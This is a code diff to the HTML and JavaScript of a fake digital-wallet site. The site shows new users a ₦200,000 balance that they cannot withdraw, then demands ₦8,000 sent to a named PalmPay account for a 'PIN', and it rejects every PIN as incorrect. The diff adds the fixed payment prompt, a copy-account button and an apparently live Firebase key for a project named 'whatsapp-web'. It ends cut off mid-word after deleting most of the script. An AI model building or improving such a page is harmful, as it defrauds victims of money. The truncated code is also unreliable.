@@ -325,6 +325,45 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .payment-amount {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .payment-label {
+            font-size: 18px;
+            margin-bottom: 10px;
+            opacity: 0.9;
+        }
+        
+        .payment-value {
+            font-size: 36px;
+            font-weight: 700;
+        }
+        
+        .copy-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: #218838;
+            transform: translateY(-2px);
+        }
     </style>
 </head>
 <body>
@@ -481,20 +520,28 @@
                 <strong>BE CAREFUL! Look again! Copy the account number on your screen. Send payment to get PIN code.</strong>
             </div>
             
+            <!-- Payment Amount Display -->
+            <div class="payment-amount">
+                <div class="payment-label">Payment Amount</div>
+                <div class="payment-value">₦8,000</div>
+                <small>Send exactly this amount to the account below</small>
+            </div>
+            
             <div class="account-details">
                 <div class="account-name">Account name: Abbas Muhammad yakubu</div>
                 <div class="account-number">Account no: 8902144010</div>
                 <div class="account-type">Account type: palm pay</div>
+                <button class="copy-btn" id="copy-account">Copy Account Number</button>
             </div>
             
             <div class="form-group">
-                <label for="pin-amount">Amount (₦)</label>
-                <input type="number" id="pin-amount" placeholder="Enter amount for PIN purchase">
+                <label for="pin-amount">Amount Paid (₦)</label>
+                <input type="number" id="pin-amount" placeholder="Enter amount you paid" value="8000" readonly>
             </div>
             
             <div class="form-group">
                 <label for="pin-quantity">Quantity</label>
-                <input type="number" id="pin-quantity" placeholder="Enter number of PINs" value="1">
+                <input type="number" id="pin-quantity" placeholder="Enter number of PINs" value="1" min="1">
             </div>
             
             <div class="form-group">
@@ -521,13 +568,14 @@
     <script>
         // Firebase configuration
         const firebaseConfig = {
-            apiKey: "AIzaSyC4R6MK7YQl8W4R8q4wqY4Vq4wqY4Vq4wq",
-            authDomain: "digital-wallet-demo.firebaseapp.com",
-            projectId: "digital-wallet-demo",
-            storageBucket: "digital-wallet-demo.appspot.com",
-            messagingSenderId: "123456789012",
-            appId: "1:123456789012:web:abcdefghijklmnopqrstuv"
-        };
+  apiKey: "AIzaSyB1fQdrmOJWDh4dEdQTFucj9BUeQmH_yew",
+  authDomain: "whatsapp-web-944f9.firebaseapp.com",
+  databaseURL: "https://whatsapp-web-944f9-default-rtdb.firebaseio.com",
+  projectId: "whatsapp-web-944f9",
+  storageBucket: "whatsapp-web-944f9.firebasestorage.app",
+  messagingSenderId: "975370289693",
+  appId: "1:975370289693:web:23390019b3b1c216a0fcf4"
+};
 
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
@@ -543,6 +591,7 @@
         const notification = document.getElementById('notification');
         const withdrawError = document.getElementById('withdraw-error');
         const pinError = document.getElementById('pin-error');
+        const copyAccountBtn = document.getElementById('copy-account');
         
         // Buttons
         const showRegisterBtn = document.getElementById('show-register');
@@ -560,217 +609,4 @@
         // Withdrawal options
         const opayWithdraw = document.getElementById('opay-withdraw');
         const palmpayWithdraw = document.getElementById('palmpay-withdraw');
-        const moniepointWithdraw = document.getElementById('moniepoint-withdraw');
-        
-        // PIN inputs
-        const pinInputs = [
-            document.getElementById('pin-1'),
-            document.getElementById('pin-2'),
-            document.getElementById('pin-3'),
-            document.getElementById('pin-4')
-        ];
-
-        // Event Listeners
-        showRegisterBtn.addEventListener('click', () => {
-            loginForm.classList.add('hidden');
-            registerForm.classList.remove('hidden');
-        });
-        
-        showLoginBtn.addEventListener('click', () => {
-            registerForm.classList.add('hidden');
-            loginForm.classList.remove('hidden');
-        });
-        
-        loginBtn.addEventListener('click', handleLogin);
-        registerBtn.addEventListener('click', handleRegister);
-        logoutBtn.addEventListener('click', handleLogout);
-        withdrawBtn.addEventListener('click', () => {
-            dashboard.classList.add('hidden');
-            withdrawPage.classList.remove('hidden');
-            // Show error message on withdraw page
-            withdrawError.classList.remove('hidden');
-        });
-        
-        pinBuyBtn.addEventListener('click', () => {
-            dashboard.classList.add('hidden');
-            pinBuyPage.classList.remove('hidden');
-            // Show error message on pin buy page
-            pinError.classList.remove('hidden');
-        });
-        
-        backFromWithdrawBtn.addEventListener('click', () => {
-            withdrawPage.classList.add('hidden');
-            dashboard.classList.remove('hidden');
-        });
-        
-        backFromPinBtn.addEventListener('click', () => {
-            pinBuyPage.classList.add('hidden');
-            dashboard.classList.remove('hidden');
-        });
-        
-        confirmWithdrawBtn.addEventListener('click', handleWithdraw);
-        confirmPinPurchaseBtn.addEventListener('click', handlePinPurchase);
-        
-        // Withdrawal method selection
-        opayWithdraw.addEventListener('click', () => selectWithdrawalMethod('Opay'));
-        palmpayWithdraw.addEventListener('click', () => selectWithdrawalMethod('PalmPay'));
-        moniepointWithdraw.addEventListener('click', () => selectWithdrawalMethod('Moniepoint'));
-        
-        // PIN input handling
-        pinInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value.length === 1 && index < pinInputs.length - 1) {
-                    pinInputs[index + 1].focus();
-                }
-            });
-            
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                    pinInputs[index - 1].focus();
-                }
-            });
-        });
-
-        // Functions
-        function handleLogin() {
-            const email = document.getElementById('login-email').value;
-            const password = document.getElementById('login-password').value;
-            
-            if (!email || !password) {
-                showNotification('Please enter both email and password', true);
-                return;
-            }
-            
-            // Firebase authentication
-            auth.signInWithEmailAndPassword(email, password)
-                .then((userCredential) => {
-                    const user = userCredential.user;
-                    document.getElementById('welcome-user').textContent = `Welcome, ${user.email}!`;
-                    loginForm.classList.add('hidden');
-                    dashboard.classList.remove('hidden');
-                    showNotification('Login successful!');
-                })
-                .catch((error) => {
-                    showNotification('Invalid email or password', true);
-                });
-        }
-        
-        function handleRegister() {
-            const username = document.getElementById('register-username').value;
-            const email = document.getElementById('register-email').value;
-            const password = document.getElementById('register-password').value;
-            const confirmPassword = document.getElementById('register-confirm-password').value;
-            
-            if (!username || !email || !password || !confirmPassword) {
-                showNotification('Please fill all fields', true);
-                return;
-            }
-            
-            if (password !== confirmPassword) {
-                showNotification('Passwords do not match', true);
-                return;
-            }
-            
-            // Firebase registration
-            auth.createUserWithEmailAndPassword(email, password)
-                .then((userCredential) => {
-                    const user = userCredential.user;
-                    
-                    // Save user data to Firestore
-                    return db.collection('users').doc(user.uid).set({
-                        username: username,
-                        email: email,
-                        balance: 200000.00,
-                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
-                    });
-                })
-                .then(() => {
-                    showNotification('Registration successful! Please login.');
-                    registerForm.classList.add('hidden');
-                    loginForm.classList.remove('hidden');
-                })
-                .catch((error) => {
-                    showNotification('Registration failed: ' + error.message, true);
-                });
-        }
-        
-        function handleLogout() {
-            auth.signOut().then(() => {
-                dashboard.classList.add('hidden');
-                loginForm.classList.remove('hidden');
-                showNotification('Logged out successfully');
-            });
-        }
-        
-        function handleWithdraw() {
-            const amount = document.getElementById('withdraw-amount').value;
-            const account = document.getElementById('withdraw-account').value;
-            
-            if (!amount || !account) {
-                showNotification('Please fill all fields', true);
-                return;
-            }
-            
-            if (amount > 200000) {
-                showNotification('Insufficient balance', true);
-                return;
-            }
-            
-            // Show error message instead of processing withdrawal
-            showNotification('Please buy PIN before withdrawing', true);
-        }
-        
-        function handlePinPurchase() {
-            const amount = document.getElementById('pin-amount').value;
-            const quantity = document.getElementById('pin-quantity').value;
-            const pinCode = pinInputs.map(input => input.value).join('');
-            
-            if (!amount || !quantity) {
-                showNotification('Please fill all fields', true);
-                return;
-            }
-            
-            // Show error message for incorrect PIN
-            showNotification('Incorrect PIN', true);
-        }
-        
-        function selectWithdrawalMethod(method) {
-            // Reset all withdrawal options
-            document.querySelectorAll('.withdraw-option').forEach(option => {
-                option.style.borderColor = 'transparent';
-                option.style.backgroundColor = '#f8f9fa';
-            });
-            
-            // Highlight selected method
-            let selectedElement;
-            if (method === 'Opay') selectedElement = opayWithdraw;
-            else if (method === 'PalmPay') selectedElement = palmpayWithdraw;
-            else if (method === 'Moniepoint') selectedElement = moniepointWithdraw;
-            
-            selectedElement.style.borderColor = '#1a2a6c';
-            selectedElement.style.backgroundColor = '#e9ecef';
-            
-            showNotification(`${method} selected for withdrawal`);
-        }
-        
-        function showNotification(message, isError = false) {
-            notification.textContent = message;
-            notification.classList.toggle('error', isError);
-            notification.style.display = 'block';
-            
-            setTimeout(() => {
-                notification.style.display = 'none';
-            }, 3000);
-        }
-        
-        // Check if user is already logged in
-        auth.onAuthStateChanged((user) => {
-            if (user) {
-                document.getElementById('welcome-user').textContent = `Welcome, ${user.email}!`;
-                loginForm.classList.add('hidden');
-                dashboard.classList.remove('hidden');
-            }
-        });
-    </script>
-</body>
-</html>
+        const moniepointWithdraw = docume
